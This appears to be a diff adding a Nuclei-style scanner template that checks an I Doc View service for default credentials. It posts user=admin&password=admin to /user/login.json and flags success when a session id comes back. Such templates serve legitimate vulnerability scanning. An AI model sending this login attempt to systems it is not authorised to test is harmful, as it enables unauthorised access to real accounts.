@@ -1,0 +1,30 @@
+id: i-doc-view-weakpassword
+
+info:
+  name: i-doc-view-weakpassword
+  author: msk
+  severity: high
+
+
+
+http:
+  - raw:
+      - |
+        POST /user/login.json HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 25
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Connection: close
+
+        user=admin&password=admin
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,'\"sid\"')
